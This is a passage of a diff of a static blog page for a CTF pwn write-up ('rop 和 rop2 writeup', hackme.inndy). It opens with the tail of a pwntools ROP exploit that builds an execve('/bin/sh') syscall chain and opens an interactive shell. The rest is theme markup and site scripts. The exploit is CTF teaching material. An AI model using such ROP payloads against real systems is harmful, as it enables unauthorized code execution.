+p.send(&quot;/bin/sh\x00&quot;)  
 
-    
+payload1 = &#39;a&#39;*0xc + &quot;BBBB&quot; + p32(syscall)  
+payload1 += p32(overflow)+ p32(0xb) + p32(bss) + p32(0) + p32(0)  #syscall(0xb,bss_add,0,0) = execve(&quot;bin/sh&quot;,0,0)  
 
-    
-    
-    
+p.send(payload1)  
+p.interactive()   
+</code></pre>
 
-    
-
-    
-      
-    
-    
-
-    
-      <div>
-        
-
-
-
-
-  
-
-
-
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>zs0zrc</li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    
-    <a href="http://yoursite.com/2018/05/09/2018-5-9-rop-和-rop2-writeup/" title="rop 和 rop2 writeup">http://yoursite.com/2018/05/09/2018-5-9-rop-和-rop2-writeup/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
-</ul>
-
-      </div>
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/writeup/" rel="tag"># writeup</a>
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/05/09/2018-5-9-homework-writeup/" rel="prev" title="homework writeup">
-                homework writeup <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-  </div>
-
-
-          </div>
-          
-
-  
-
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="zs0zrc">
-            
-              <p class="site-author-name" itemprop="name">zs0zrc</p>
-              <div class="site-description motion-element" itemprop="description">zs0zrc's blog</div>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
+            </div>
+            <hr>
+            <div>
+              <p>
                 
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">53</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/hackme-inndy-writeup/">hackme.inndy_writeup</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
                 
                 
-                <div class="site-state-item site-state-categories">
-                  
+                  <span>
+                <i class="iconfont icon-tag"></i>
                     
-                      <a href="/categories/">
+                      <a class="hover-with-bg" href="/tags/writeup/">writeup</a>
                     
-                  
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
                     
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">13</span>
-                    <span class="site-state-item-name">分类</span>
-                  </a>
-                </div>
-              
-
-              
+                  </span>
                 
-                
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                      <a href="/tags/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">20</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
+              </p>
               
-            </nav>
-          
-
-          
-
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://github.com/zszcr" title="GitHub &rarr; https://github.com/zszcr" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://twitter.com/1PFjclRQBHRAuEE" title="Twitter &rarr; https://twitter.com/1PFjclRQBHRAuEE" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
-                </span>
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
               
             </div>
-          
-
-          
-             <div class="cc-license motion-element" itemprop="license">
-              
-              
-                
-              
-              
-              
-              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
-             </div>
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://23r3f.github.io/" title="https://23r3f.github.io/" rel="noopener" target="_blank">23R3F</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://myhackerworld.top/" title="http://myhackerworld.top/" rel="noopener" target="_blank">D4rk3r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://m4x.fun/" title="http://m4x.fun/" rel="noopener" target="_blank">M4X</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://n132.github.io/" title="https://n132.github.io/" rel="noopener" target="_blank">n13r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://aluvion.github.io/" title="https://aluvion.github.io/" rel="noopener" target="_blank">Twings</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://littleredlie.github.io/" title="https://littleredlie.github.io/" rel="noopener" target="_blank">LittleRed</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://glarcy.github.io/" title="https://glarcy.github.io/" rel="noopener" target="_blank">Glarcy</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
-            
-          
-          
-
-        </div>
-      </div>
-
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
 
             
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#rop"><span class="nav-number">1.</span> <span class="nav-text">rop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rop2"><span class="nav-number">2.</span> <span class="nav-text">rop2</span></a></li></ol></div>
-            
-
           </div>
         </div>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-  
-
-
-        
       </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">zs0zrc</span>
-
-  
-
-  
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
 </div>
 
-
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.1.0</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
       </div>
     
+  </div>
+</div>
+
+<!-- Custom -->
+
 
     
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
+
 
     
 
     
   </div>
+</footer>
 
-  
-
-<script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  <script src="/js/lazyload.js"></script>
 
 
 
   
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var post = $('#post');
+      var toc = $('#toc');
+      var tocLimMax = post.offset().top + post.height() - navHeight;
 
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
 
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/utils.js?v=7.1.0"></script>
-
-  <script src="/js/motion.js?v=7.1.0"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/affix.js?v=7.1.0"></script>
-
-  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
-
-
-
-  
-  <script src="/js/scrollspy.js?v=7.1.0"></script>
-<script src="/js/post-details.js?v=7.1.0"></script>
-
-
-
-  
-
-
-  <script src="/js/next-boot.js?v=7.1.0"></script>
-
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-
-  
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = $('#board-ctn').css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
 
 
 
 
-  
 
-  
 
-  
 
-  
+  <script defer src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
-  
 
-  
 
-  
 
-  
+<!-- Plugins -->
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "rop 和 rop2 writeup&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
 
 </body>
 </html>
